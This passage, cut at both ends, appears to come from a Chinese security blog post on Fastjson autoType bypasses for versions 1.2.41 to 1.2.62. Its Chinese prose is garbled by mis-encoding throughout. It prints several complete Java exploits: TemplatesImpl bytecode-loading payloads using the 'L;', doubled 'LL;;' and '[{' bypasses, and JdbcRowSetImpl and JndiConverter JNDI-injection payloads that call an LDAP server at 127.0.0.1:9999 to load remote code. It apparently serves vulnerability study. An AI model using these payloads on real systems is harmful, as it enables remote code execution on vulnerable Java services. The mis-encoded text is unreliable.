readClass(evilClassPath);<br>            ParserConfig.getGlobalInstance().setAutoTypeSupport(<span class="hljs-literal">true</span>); <span class="hljs-comment">//å¼€å¯AutoTypeSupport</span><br>            <span class="hljs-keyword">final</span> <span class="hljs-type">String</span> <span class="hljs-variable">NASTY_CLASS</span> <span class="hljs-operator">=</span> <span class="hljs-string">&quot;Lcom.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl;&quot;</span>; <span class="hljs-comment">//å‰é¢åŠ äº†Lï¼Œç»“å°¾åŠ äº†;</span><br>            <span class="hljs-type">String</span> <span class="hljs-variable">payload</span> <span class="hljs-operator">=</span> <span class="hljs-string">&quot;&#123;\&quot;@type\&quot;:\&quot;&quot;</span> + NASTY_CLASS +<br>                    <span class="hljs-string">&quot;\&quot;,\&quot;_bytecodes\&quot;:[\&quot;&quot;</span>+evilCode+<span class="hljs-string">&quot;\&quot;],&#x27;_name&#x27;:&#x27;&#x27;,&#x27;_tfactory&#x27;:&#123; &#125;,\&quot;_outputProperties\&quot;:&#123; &#125;&quot;</span>;<br><br>            JSON.parseObject(payload, Feature.SupportNonPublicField);<br>        &#125; <span class="hljs-keyword">catch</span> (Exception e) &#123;<br>            e.printStackTrace();<br>        &#125;<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><p><img src="https://cdn.clown2024.cn/202408310015033.png" alt="image-20240831001535905"></p><p>ç„¶åæ¥çœ‹ä¸€ä¸‹å…·ä½“çš„ç»•è¿‡åŸç†</p><p>å…ˆå»çœ‹ä¸€ä¸‹checkAutoTypeå‡½æ•°åœ¨å“ªé‡Œè¢«è°ƒç”¨</p><p><img src="https://cdn.clown2024.cn/202408310022516.png" alt="image-20240831002214426"></p><p>æˆ‘ä»¬å¯ä»¥å¯¹æ¯”ä¹‹å‰çš„ç‰ˆæœ¬æ¥çœ‹ï¼Œä¹‹å‰çš„ç‰ˆæœ¬æ˜¯ç›´æ¥loadClassäº†ï¼Œæˆ‘ä»¬è¿›åˆ°è¿™ä¸ªå‡½æ•°é‡Œé¢çœ‹çœ‹</p><p><img src="https://cdn.clown2024.cn/202408310026977.png" alt="image-20240831002652886"></p><p>è¿™é‡Œæˆ‘ä»¬å¦‚æœè®¾ç½®äº†autoTypeSupportä¸ºtrueä»–å°±ä¼šå»å°†æˆ‘ä»¬çš„è¿™ä¸ªç±»å»åŒ¹é…ç™½åå•ï¼ŒåŒ¹é…åˆ°äº†å°±loadClass</p><p>å¦‚æœæ²¡åŒ¹é…åˆ°å°±ä¼šè¿›åˆ°ä¸‹é¢é»‘åå•çš„åŒ¹é…</p><p><img src="https://cdn.clown2024.cn/202408310030353.png" alt="image-20240831003005272"></p><p>åŒ¹é…åˆ°é»‘åå•å°±ä¼šæŠ›å‡ºå¼‚å¸¸<strong>autoType is not support</strong></p><p><img src="https://cdn.clown2024.cn/202408310032079.png" alt="image-20240831003254981"></p><p>å¦‚æœæ²¡æœ‰å¼€å¯autoTypeSupportå°±ä¼šå…ˆåŒ¹é…é»‘åå•å†åŒ¹é…ç™½åå•</p><p>æœ€åå¦‚æœè¦æ˜¯é»‘ç™½åå•éƒ½åŒ¹é…ä¸åˆ°ï¼ŒautoTypeSupportä¸ºtrueä¸”expectClassä¸ä¸ºnullå°±ç›´æ¥loadClass</p><p><img src="https://cdn.clown2024.cn/202408310036025.png" alt="image-20240831003602958"></p><p>å¦åˆ™å°±ä¸åŠ è½½è¿™ä¸ªç±»äº†ç›´æ¥ï¼Œæˆ‘ä»¬payloadæœ€åè¿›åˆ°çš„å°±æ˜¯é»‘ç™½åå•éƒ½åŠ è½½ä¸åˆ°çš„loadClassï¼Œæˆ‘ä»¬è¿›loadClassæ–¹æ³•é‡Œé¢çœ‹ä¸€ä¸‹</p><p><img src="https://cdn.clown2024.cn/202408310039880.png" alt="image-20240831003942791"></p><p>è¿™é‡Œå°±é‡åˆ°äº†æˆ‘ä»¬å‰é¢æåˆ°çš„ç”¨æ¥ç»•è¿‡çš„åœ°æ–¹</p><p>å…ˆçœ‹ç¬¬ä¸€ä¸ªç®­å¤´å¤„çš„ä»£ç ï¼Œå¦‚æœç±»åçš„å­—ç¬¦ä¸²ä»¥[å¼€å¤´ï¼Œåˆ™è¯´æ˜è¯¥ç±»æ˜¯ä¸€ä¸ªæ•°ç»„ç±»å‹ï¼Œéœ€è¦é€’å½’è°ƒç”¨loadClassæ–¹æ³•æ¥åŠ è½½æ•°ç»„å…ƒç´ ç±»å‹å¯¹åº”çš„classå¯¹è±¡ç„¶åä½¿ç”¨Array.newInstanceæ–¹æ³•æ¥åˆ›å»ºä¸€ä¸ªç©ºæ•°ç»„å¯¹è±¡ï¼Œæœ€åè¿”å›è¯¥æ•°ç»„å¯¹è±¡çš„classå¯¹è±¡</p><p>ç¬¬äºŒä¸ªç®­å¤´å¤„çš„ä»£ç ï¼Œå¦‚æœç±»åçš„å­—ç¬¦ä¸²ä»¥Lå¼€å¤´å¹¶ä»¥;ç»“å°¾ï¼Œåˆ™è¯´æ˜è¯¥ç±»æ˜¯ä¸€ä¸ªæ™®é€šçš„Javaç±»ï¼Œéœ€è¦æŠŠå¼€å¤´çš„Lå’Œç»“å°¾çš„;ç»™å»æ‰ï¼Œç„¶åé€’å½’è°ƒç”¨loadClass</p><p>é‚£å…¶å®å°±å¾ˆæ¸…æ™°äº†ï¼Œå¾ˆå®¹æ˜“å°±æ˜ç™½æˆ‘ä»¬å‰é¢payloadçš„ç»•è¿‡åŸç†</p><blockquote><p>ä¸ç”¨[çš„åŸå› æ˜¯fastjsonåœ¨å‰é¢å·²ç»åˆ¤æ–­è¿‡æ˜¯å¦ä¸ºæ•°ç»„äº†ï¼Œå®é™…èµ°ä¸åˆ°è¿™ä¸€æ­¥</p></blockquote><p>ç»•è¿‡å°±ä¸¤æ­¥</p><ol><li>å¼€å¯autoTypeSupport</li><li>Lå¼€å¤´;ç»“å°¾</li></ol><p>ä¸è¿‡è¿™ä¸ªå‚æ•°è¦åœ¨æœåŠ¡ç«¯æ‰‹åŠ¨å¼€å¯ï¼Œé»˜è®¤ä¸ºfalseå¯ç”¨ç™½åå•ï¼Œæœ‰ç‚¹ä¸å¥½åˆ©ç”¨æˆ‘æ„Ÿè§‰</p><h1 id="fastjson1242"><a href="#FastJson1-2-42" class="headerlink" title="FastJson1.2.42"></a>FastJson1.2.42</h1><p>è¯¥ç‰ˆæœ¬ä¿®æ”¹äº†ä¸‹é¢ä¸¤ç‚¹ï¼š</p><ul><li>é»‘åå•æ”¹ä¸ºäº†hashå€¼ï¼Œé˜²æ­¢ç»•è¿‡</li><li>å¯¹äºä¼ å…¥çš„ç±»åï¼Œåˆ é™¤å¼€å¤´<code>L</code>å’Œç»“å°¾çš„<code>;</code></li></ul><p><img src="https://cdn.clown2024.cn/202408310051883.png" alt="image-20240831005115787"></p><blockquote><p>ç¬‘æ­»äº†ï¼Œæ–‡ç« è¿˜æ²¡çœ‹å®ŒçŒœæµ‹æ˜¯ä¸æ˜¯å°±æå‰æ ¡éªŒåˆ äº†ä¸€æ¬¡ï¼Œç›´æ¥çŒœåŒå†™èƒ½ä¸èƒ½ç»•è¿‡ï¼Œç»“æœçœŸç»•è¿‡å»äº†ğŸ¤£</p></blockquote><p>çœ‹ä¸€ä¸‹ä»–çš„checkAutoTypeå‡½æ•°å˜åŒ–</p><p><img src="https://cdn.clown2024.cn/202408311524654.png" alt="image-20240831152406512"></p><p>æ€»ä¹‹è¿™é‡Œå°±æ˜¯å¯¹å­—ç¬¦ä¸²è¿›è¡Œäº†æˆªå–ä½†åªæˆªå–äº†ä¸€æ¬¡</p><p>TemplatesImplçš„expå¦‚ä¸‹ï¼š</p><figure class="highlight java"><table><tr><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">package</span> org.clown.Templates;<br><br><br><span class="hljs-keyword">import</span> com.alibaba.fastjson.parser.Feature;<br><span class="hljs-keyword">import</span> com.alibaba.fastjson.*;<br><span class="hljs-keyword">import</span> com.alibaba.fastjson.parser.ParserConfig;<br><br><br><span class="hljs-keyword">import</span> java.io.ByteArrayOutputStream;<br><span class="hljs-keyword">import</span> java.io.FileInputStream;<br><span class="hljs-keyword">import</span> java.util.Base64;<br><br><span class="hljs-comment">//FastJson1.2.42</span><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">Exploit1</span> &#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> String <span class="hljs-title function_">readClass</span><span class="hljs-params">(String cls)</span>&#123;<br>        <span class="hljs-type">byte</span>[] buffer = <span class="hljs-literal">null</span>;<br>        <span class="hljs-keyword">try</span> &#123;<br>            <span class="hljs-type">FileInputStream</span> <span class="hljs-variable">fis</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">FileInputStream</span>(cls);<br>            <span class="hljs-type">ByteArrayOutputStream</span> <span class="hljs-variable">bos</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">ByteArrayOutputStream</span>();<br>            <span class="hljs-type">byte</span>[] b = <span class="hljs-keyword">new</span> <span class="hljs-title class_">byte</span>[<span class="hljs-number">1024</span>];<br>            <span class="hljs-type">int</span> n;<br>            <span class="hljs-keyword">while</span>((n = fis.read(b))!=-<span class="hljs-number">1</span>) &#123;<br>                bos.write(b,<span class="hljs-number">0</span>,n);<br>            &#125;<br>            fis.close();<br>            bos.close();<br>            buffer = bos.toByteArray();<br>        &#125;<span class="hljs-keyword">catch</span>(Exception e) &#123;<br>            e.printStackTrace();<br>        &#125;<br>        Base64.<span class="hljs-type">Encoder</span> <span class="hljs-variable">encoder</span> <span class="hljs-operator">=</span> Base64.getEncoder();<br>        <span class="hljs-type">String</span> <span class="hljs-variable">value</span> <span class="hljs-operator">=</span> encoder.encodeToString(buffer);<br>        <span class="hljs-keyword">return</span> value;<br>    &#125;<br><br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">main</span><span class="hljs-params">(String args[])</span>&#123;<br>        <span class="hljs-keyword">try</span> &#123;<br>            <span class="hljs-keyword">final</span> <span class="hljs-type">String</span> <span class="hljs-variable">evilClassPath</span> <span class="hljs-operator">=</span> System.getProperty(<span class="hljs-string">&quot;user.dir&quot;</span>) + <span class="hljs-string">&quot;\\target\\classes\\org\\clown\\Templates\\Evil.class&quot;</span>;<br>            System.out.println(evilClassPath);<br>            <span class="hljs-type">String</span> <span class="hljs-variable">evilCode</span> <span class="hljs-operator">=</span> readClass(evilClassPath);<br>            ParserConfig.getGlobalInstance().setAutoTypeSupport(<span class="hljs-literal">true</span>); <span class="hljs-comment">//å¼€å¯AutoTypeSupport</span><br>            <span class="hljs-keyword">final</span> <span class="hljs-type">String</span> <span class="hljs-variable">NASTY_CLASS</span> <span class="hljs-operator">=</span> <span class="hljs-string">&quot;LLcom.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl;;&quot;</span>; <span class="hljs-comment">//å‰é¢åŠ äº†Lï¼Œç»“å°¾åŠ äº†; è¿›è¡Œäº†åŒå†™ç»•è¿‡</span><br>            <span class="hljs-type">String</span> <span class="hljs-variable">payload</span> <span class="hljs-operator">=</span> <span class="hljs-string">&quot;&#123;\&quot;@type\&quot;:\&quot;&quot;</span> + NASTY_CLASS +<br>                    <span class="hljs-string">&quot;\&quot;,\&quot;_bytecodes\&quot;:[\&quot;&quot;</span>+evilCode+<span class="hljs-string">&quot;\&quot;],&#x27;_name&#x27;:&#x27;&#x27;,&#x27;_tfactory&#x27;:&#123; &#125;,\&quot;_outputProperties\&quot;:&#123; &#125;&quot;</span>;<br><br>            JSON.parseObject(payload, Feature.SupportNonPublicField);<br>        &#125; <span class="hljs-keyword">catch</span> (Exception e) &#123;<br>            e.printStackTrace();<br>        &#125;<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><h1 id="fastjson1243"><a href="#FastJson1-2-43" class="headerlink" title="FastJson1.2.43"></a>FastJson1.2.43</h1><p>è¿™ä¸ªç‰ˆæœ¬åˆæ˜¯ä¿®æ”¹äº†checkAutoTypeå‡½æ•°ï¼Œè¿™æ¬¡å¯¹äºLLç­‰å¼€å¤´ç»“å°¾çš„å­—ç¬¦ä¸²ç›´æ¥æŠ›å‡ºå¼‚å¸¸</p><p>ä¸Šé¢payloadæ‰§è¡Œç»“æœ</p><p><img src="https://cdn.clown2024.cn/202408311527303.png" alt="image-20240831152750175"></p><p>çœ‹ä¸€ä¸‹checkAutoTypeå‡½æ•°</p><p><img src="https://cdn.clown2024.cn/202408311530201.png" alt="image-20240831153008103"></p><p>è¿™é‡Œç›´æ¥å°±æŠ›å¼‚å¸¸äº†</p><p>ä½†æ˜¯æ²¡æœ‰å¯¹[è¿›è¡Œé™åˆ¶ï¼Œå¯ä»¥é€šè¿‡[{æ¥ç»•è¿‡ï¼Œæ”¹åçš„expå¦‚ä¸‹</p><figure class="highlight java"><table><tr><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">package</span> org.clown.Templates;<br><br><br><span class="hljs-keyword">import</span> com.alibaba.fastjson.parser.Feature;<br><span class="hljs-keyword">import</span> com.alibaba.fastjson.*;<br><span class="hljs-keyword">import</span> com.alibaba.fastjson.parser.ParserConfig;<br><br><br><span class="hljs-keyword">import</span> java.io.ByteArrayOutputStream;<br><span class="hljs-keyword">import</span> java.io.FileInputStream;<br><span class="hljs-keyword">import</span> java.util.Base64;<br><br><span class="hljs-comment">//FastJson1.2.43</span><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">Exploit2</span> &#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> String <span class="hljs-title function_">readClass</span><span class="hljs-params">(String cls)</span>&#123;<br>        <span class="hljs-type">byte</span>[] buffer = <span class="hljs-literal">null</span>;<br>        <span class="hljs-keyword">try</span> &#123;<br>            <span class="hljs-type">FileInputStream</span> <span class="hljs-variable">fis</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">FileInputStream</span>(cls);<br>            <span class="hljs-type">ByteArrayOutputStream</span> <span class="hljs-variable">bos</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">ByteArrayOutputStream</span>();<br>            <span class="hljs-type">byte</span>[] b = <span class="hljs-keyword">new</span> <span class="hljs-title class_">byte</span>[<span class="hljs-number">1024</span>];<br>            <span class="hljs-type">int</span> n;<br>            <span class="hljs-keyword">while</span>((n = fis.read(b))!=-<span class="hljs-number">1</span>) &#123;<br>                bos.write(b,<span class="hljs-number">0</span>,n);<br>            &#125;<br>            fis.close();<br>            bos.close();<br>            buffer = bos.toByteArray();<br>        &#125;<span class="hljs-keyword">catch</span>(Exception e) &#123;<br>            e.printStackTrace();<br>        &#125;<br>        Base64.<span class="hljs-type">Encoder</span> <span class="hljs-variable">encoder</span> <span class="hljs-operator">=</span> Base64.getEncoder();<br>        <span class="hljs-type">String</span> <span class="hljs-variable">value</span> <span class="hljs-operator">=</span> encoder.encodeToString(buffer);<br>        <span class="hljs-keyword">return</span> value;<br>    &#125;<br><br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">main</span><span class="hljs-params">(String args[])</span>&#123;<br>        <span class="hljs-keyword">try</span> &#123;<br>            <span class="hljs-keyword">final</span> <span class="hljs-type">String</span> <span class="hljs-variable">evilClassPath</span> <span class="hljs-operator">=</span> System.getProperty(<span class="hljs-string">&quot;user.dir&quot;</span>) + <span class="hljs-string">&quot;\\target\\classes\\org\\clown\\Templates\\Evil.class&quot;</span>;<br>            System.out.println(evilClassPath);<br>            <span class="hljs-type">String</span> <span class="hljs-variable">evilCode</span> <span class="hljs-operator">=</span> readClass(evilClassPath);<br>            ParserConfig.getGlobalInstance().setAutoTypeSupport(<span class="hljs-literal">true</span>); <span class="hljs-comment">//å¼€å¯AutoTypeSupport</span><br>            <span class="hljs-keyword">final</span> <span class="hljs-type">String</span> <span class="hljs-variable">NASTY_CLASS</span> <span class="hljs-operator">=</span> <span class="hljs-string">&quot;[com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl&quot;</span>; <span class="hljs-comment">//ç”¨[&#123;æ¥ç»•è¿‡</span><br>            <span class="hljs-type">String</span> <span class="hljs-variable">payload</span> <span class="hljs-operator">=</span> <span class="hljs-string">&quot;&#123;\&quot;@type\&quot;:\&quot;&quot;</span> + NASTY_CLASS +<br>                    <span class="hljs-string">&quot;\&quot;[&#123;,\&quot;_bytecodes\&quot;:[\&quot;&quot;</span>+evilCode+<span class="hljs-string">&quot;\&quot;],&#x27;_name&#x27;:&#x27;&#x27;,&#x27;_tfactory&#x27;:&#123; &#125;,\&quot;_outputProperties\&quot;:&#123; &#125;&quot;</span>;<br><br>            JSON.parseObject(payload, Feature.SupportNonPublicField);<br>        &#125; <span class="hljs-keyword">catch</span> (Exception e) &#123;<br>            e.printStackTrace();<br>        &#125;<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><p><img src="https://cdn.clown2024.cn/202408311541263.png" alt="image-20240831154143113"></p><p>åˆ†æä¸€ä¸‹è¿™ä¸ªpayloadçš„åŸç†ï¼Œé¦–å…ˆå‰é¢æˆ‘ä»¬çŸ¥é“åªåŠ ä¸€ä¸ª[æ˜¯å¯ä»¥è¿›å…¥loadClassé‡Œé¢çš„ï¼Œä½†æ˜¯æ­¤æ—¶ä¼šjsonè§£æé”™è¯¯</p><p><img src="https://cdn.clown2024.cn/202408311550012.png" alt="image-20240831155047869"></p><p>è¿™é‡Œè¯´æœŸå¾…ä¸€ä¸ª[ä½†æ˜¯åœ¨ç¬¬ä¸ƒåä¸€ä½ç½®æ˜¯â€™,â€™ï¼Œå°±æ˜¯TemplatesImplåé¢é‚£ä¸ªé€—å·çš„ä½ç½®</p><p>é‚£æˆ‘ä»¬å°±è¡¥ä¸Šä¸€ä¸ª[</p><p><img src="https://cdn.clown2024.cn/202408311554785.png" alt="image-20240831155444662"></p><p>ç„¶ååˆè¯´ç¼ºå°‘ä¸€ä¸ª{ï¼Œé‚£å†è¡¥ä¸Šå»å³å¯</p><blockquote><p>ä¸è¿‡æ€ªæ€ªçš„è¿™å°±èƒ½è§£ææˆåŠŸäº†ï¼ŸğŸ˜¢</p></blockquote><h1 id="fastjson1225-1247é€šæ€"><a href="#FastJson1-2-25-1-2-47é€šæ€" class="headerlink" title="FastJson1.2.25-1.2.47é€šæ€"></a>FastJson1.2.25-1.2.47é€šæ€</h1><p><strong>å½±å“ç‰ˆæœ¬</strong></p><p>1.2.25-1.2.32:</p><p>æœªå¼€å¯AutoTypeSupportæ—¶èƒ½æˆåŠŸåˆ©ç”¨ï¼Œå¼€å¯äº†åè€Œä¸è¡Œ</p><p>1.2.33-1.2.47:</p><p>æ— è®ºæ˜¯å¦å¼€å¯AutoTypeSupportéƒ½èƒ½æˆåŠŸåˆ©ç”¨</p><p><strong>å…¶ä»–çš„é™åˆ¶</strong></p><p>åŸºäºRMIåˆ©ç”¨çš„JDKç‰ˆæœ¬&lt;&#x3D;6u141ã€7u131ã€8u121ï¼ŒåŸºäºLDAPåˆ©ç”¨çš„JDKç‰ˆæœ¬&lt;&#x3D;6u211ã€7u201ã€8u191</p><h2 id="1225ltx3dfastjsonltx3d1232"><a href="#1-2-25" class="headerlink" title="1.2.25&lt;&#x3D;Fastjson&lt;&#x3D;1.2.32"></a>1.2.25&lt;&#x3D;Fastjson&lt;&#x3D;1.2.32</h2><p>å…ˆç»™å‡ºexpï¼Œè¿™é‡Œç”¨çš„JdbcRowSetImplçš„é“¾å­</p><figure class="highlight java"><table><tr><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">import</span> com.alibaba.fastjson.JSON;<br><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">Fastjson6</span> &#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">main</span><span class="hljs-params">(String[] args)</span> <span class="hljs-keyword">throws</span> Exception&#123;<br>        <span class="hljs-type">String</span> <span class="hljs-variable">payload</span> <span class="hljs-operator">=</span> <span class="hljs-string">&quot;&#123;\n&quot;</span> +<br>                <span class="hljs-string">&quot;    \&quot;a\&quot;:&#123;\n&quot;</span> +<br>                <span class="hljs-string">&quot;        \&quot;@type\&quot;:\&quot;java.lang.Class\&quot;,\n&quot;</span> +<br>                <span class="hljs-string">&quot;        \&quot;val\&quot;:\&quot;com.sun.rowset.JdbcRowSetImpl\&quot;\n&quot;</span> +<br>                <span class="hljs-string">&quot;    &#125;,\n&quot;</span> +<br>                <span class="hljs-string">&quot;    \&quot;b\&quot;:&#123;\n&quot;</span> +<br>                <span class="hljs-string">&quot;        \&quot;@type\&quot;:\&quot;com.sun.rowset.JdbcRowSetImpl\&quot;,\n&quot;</span> +<br>                <span class="hljs-string">&quot;        \&quot;dataSourceName\&quot;:\&quot;ldap://127.0.0.1:9999/zoZdyoJH\&quot;,\n&quot;</span> +<br>                <span class="hljs-string">&quot;        \&quot;autoCommit\&quot;:true\n&quot;</span> +<br>                <span class="hljs-string">&quot;    &#125;\n&quot;</span> +<br>                <span class="hljs-string">&quot;&#125;&quot;</span>;<br>        JSON.parse(payload);<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><p><img src="https://cdn.clown2024.cn/202408311634449.png" alt="image-20240831163451309"></p><p>æ•´ä½“æ€è·¯ï¼šé€šè¿‡java.lang.Classï¼Œå°†JdbcRowSetImplç±»åŠ è½½åˆ°Mapä¸­ç¼“å­˜ï¼Œä»è€Œç»•è¿‡AutoTypeçš„æ£€æµ‹ã€‚å› æ­¤å°†payloadåˆ†ä¸¤æ¬¡å‘é€ï¼Œç¬¬ä¸€æ¬¡åŠ è½½ï¼Œç¬¬äºŒæ¬¡æ‰§è¡Œã€‚é»˜è®¤æƒ…å†µä¸‹ï¼Œåªè¦é‡åˆ°æ²¡æœ‰åŠ è½½åˆ°ç¼“å­˜çš„ç±»ï¼ŒcheckAutoType()å°±ä¼šæŠ›å‡ºå¼‚å¸¸ç»ˆæ­¢ç¨‹åºã€‚</p><p>å»çœ‹ä¸€ä¸‹ä»–çš„checkAutoTypeå‡½æ•°æ¥åˆ†æä¸€ä¸‹</p><p><img src="https://cdn.clown2024.cn/202408311638035.png" alt="image-20240831163822049"></p><p>æˆ‘ä»¬å…ˆä»ç¼“å­˜ä¸­å»è·å–è¿™ä¸ªç±»ï¼Œç„¶åä¸ºnullç›´æ¥åˆ°findClassè¿™é‡Œï¼Œè¿™é‡Œçš„ç¼“å­˜mappingåœ¨ä¸€å¼€å§‹çš„æ—¶å€™ä¼šè‡ªåŠ¨æ‰§è¡Œé™æ€ä»£ç å—æ”¾ä¸€äº›ç±»è¿›å»</p><p><img src="https://cdn.clown2024.cn/202408311643708.png" alt="image-20240831164311603"></p><p>ç„¶åéå†bucketsï¼Œæ ¹æ®é”®å€¼æŸ¥æ‰¾æ˜¯å¦å­˜åœ¨è¯¥ç±»ï¼Œè¿™é‡Œæ˜¯å¯ä»¥ç›´æ¥æ‰¾åˆ°çš„ï¼Œç„¶ååˆ¤æ–­clazzä¸ä¸ºç©ºåç›´æ¥è¿”å›</p><p>ç„¶åä¸€è·¯å¾€ä¸‹èµ°åˆ°deserializeçš„åœ°æ–¹</p><p><img src="https://cdn.clown2024.cn/202408311646395.png" alt="image-20240831164635293"></p><p>è¿™é‡Œè°ƒç”¨çš„æ˜¯**MiscCodec.deserialze()**ï¼Œèµ°è¿›å»è·Ÿè¿›</p><p><img src="https://cdn.clown2024.cn/202408311649743.png" alt="image-20240831164903622"></p><p>å¾€ä¸‹åˆ°è¿™é‡Œï¼Œåˆ¤æ–­é”®å€¼æ˜¯å¦ä¸ºvalï¼Œæ˜¯çš„è¯å†æå–valé”®å¯¹åº”çš„å€¼èµ‹ç»™objValå˜é‡ï¼Œè€ŒobjValåœ¨åé¢ä¼šèµ‹å€¼ç»™strValå˜é‡</p><p><img src="https://cdn.clown2024.cn/202408311650152.png" alt="image-20240831165057048"></p><p>è¿™é‡Œèµ‹å€¼äº†ç»™strVal</p><p>ç„¶åç»§ç»­å¾€ä¸‹</p><p><img src="https://cdn.clown2024.cn/202408311658049.png" alt="image-20240831165810941"></p><p>åˆ¤æ–­clazzæ˜¯å¦ä¸ºClass.classï¼Œç„¶ååˆ°è¿™é‡ŒloadClass</p><p><img src="https://cdn.clown2024.cn/202408311659949.png" alt="image-20240831165951852"></p><p>loadå®Œä¹‹åå°±ä¼šæ”¾å…¥ç¼“å­˜ä¸­</p><p>ç„¶ååœ¨æ‰«æç¬¬äºŒéƒ¨åˆ†JSONæ•°æ®çš„æ—¶å€™ï¼Œç”±äºæˆ‘ä»¬çš„ç±»å·²ç»è¢«æ”¾åœ¨ç¼“å­˜ä¸­äº†ï¼Œæˆ‘ä»¬åœ¨å‰é¢çš„**TypeUtils.getClassFromMapping(typeName)**å°±èƒ½è·å–åˆ°clazzï¼Œç„¶åç›´æ¥è¿”å›</p><p><img src="https://cdn.clown2024.cn/202408311703708.png" alt="image-20240831170308601"></p><p>å¯ä»¥çœ‹åˆ°ç›´æ¥è¿”å›ä»è€Œç»•è¿‡äº†checkAutoType</p><p>ç„¶åå¦‚æœå¼€å¯äº†autoTypeSupportçš„è¯å°±ä¼šæ— æ³•ç»•è¿‡å‰é¢çš„é»‘åå•ï¼Œæ‰€ä»¥å¼€å¯äº†åè€Œä¸è¡Œ</p><p><img src="https://cdn.clown2024.cn/202408311704028.png" alt="image-20240831170428910"></p><h2 id="1233ltx3dfastjsonltx3d1247"><a href="#1-2-33" class="headerlink" title="1.2.33&lt;&#x3D;Fastjson&lt;&#x3D;1.2.47"></a>1.2.33&lt;&#x3D;Fastjson&lt;&#x3D;1.2.47</h2><p>è¿™éƒ¨åˆ†çš„ç‰ˆæœ¬å¼€äº†autoTypeSupportæ˜¯å¯ä»¥æˆåŠŸ</p><p><strong>æœªå¼€å¯autoTypeæ—¶</strong></p><p>è¿™é‡Œå°±å’Œå‰é¢ä¸€æ ·å°±ä¸ç”¨åˆ†æäº†</p><p><strong>å¼€å¯autoTypeæ—¶</strong></p><p>è¿™é‡ŒcheckAutoTypeæ”¹äº†ä¸€ç‚¹åœ°æ–¹</p><p><img src="https://cdn.clown2024.cn/202408311724426.png" alt="image-20240831172445310"></p><p>è¿™é‡Œå¤šäº†ä¸€ä¸ªåˆ¤æ–­ï¼Œéœ€è¦**TypeUtils.getClassFromMapping(typeName)**è¿”å›ä¸ºnullæ‰è¡Œï¼Œæˆ‘ä»¬è¿™é‡Œè¿”å›ä¸ä¸ºnullè‡ªç„¶ä¹Ÿä¸ä¼šæŠ›å‡ºå¼‚å¸¸</p><h1 id="fastjson1248-1268"><a href="#Fastjson1-2-48-1-2-68" class="headerlink" title="Fastjson1.2.48-1.2.68"></a>Fastjson1.2.48-1.2.68</h1><p>è¿™éƒ¨åˆ†ç‰ˆæœ¬å¾ˆå¤šéƒ½æ˜¯ç”¨é»‘åå•ç»•è¿‡çš„åˆ©ç”¨æ–¹å¼ï¼Œå‚è€ƒæ–‡ç« ï¼š<a href="https://www.anquanke.com/post/id/232774">https://www.anquanke.com/post/id/232774</a></p><h2 id="fastjsonltx3d1262"><a href="#Fastjson" class="headerlink" title="Fastjson&lt;&#x3D;1.2.62"></a>Fastjson&lt;&#x3D;1.2.62</h2><p>ä¸€æ ·å…ˆç»™ä¸ªpayload</p><p>org.apache.xbean.propertyeditor.JndiConverterç±»çš„toObjectImpl()å‡½æ•°å­˜åœ¨JNDIæ³¨å…¥æ¼æ´</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><code class="hljs plaintext">&#123;&quot;@type&quot;:&quot;org.apache.xbean.propertyeditor.JndiConverter&quot;,&quot;AsText&quot;:&quot;ldap://127.0.0.1:9999/zoZdyoJH&quot;&#125;;<br></code></pre></td></tr></table></figure><p>expå¦‚ä¸‹ï¼š</p><figure class="highlight java"><table><tr><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">package</span> org.clown.JNDITest;<br><br><br><span class="hljs-keyword">import</span> com.alibaba.fastjson.JSON;<br><span class="hljs-keyword">import</span> com.alibaba.fastjson.parser.ParserConfig;<br><br><span class="hljs-comment">//fastjson1.2.62</span><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">Advanced_Version</span> &#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">main</span><span class="hljs-params">(String[] args)</span> &#123;<br>        ParserConfig.getGlobalInstance().setAutoTypeSupport(<span class="hljs-literal">true</span>);<br>        <span class="hljs-type">String</span> <span class="hljs-variable">poc</span> <span class="hljs-operator">=</span> <span class="hljs-string">&quot;&#123;\&quot;@type\&quot;:\&quot;org.apache.xbean.propertyeditor.JndiConverter\&quot;,\&quot;AsText\&quot;:\&quot;ldap://127.0.0.1:9999/zoZdyoJH\&quot;&#125;&quot;</span>;<br>        JSON.parse(poc);<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><p>è¯¥åˆ©ç”¨æ–¹å¼è¿˜éœ€è¦æˆ‘ä»¬æ»¡è¶³ä¸€äº›å‰ç½®æ¡ä»¶ï¼š</p><ul><li><p>éœ€è¦å¼€å¯AutoTypeï¼›</p></li><li><p>Fastjson &lt;&#x3D; 1.2.62ï¼›</p></li><li><p>JNDIæ³¨å…¥åˆ©ç”¨æ‰€å—çš„JDKç‰ˆæœ¬é™åˆ¶ï¼›</p></li><li><p>ç›®æ 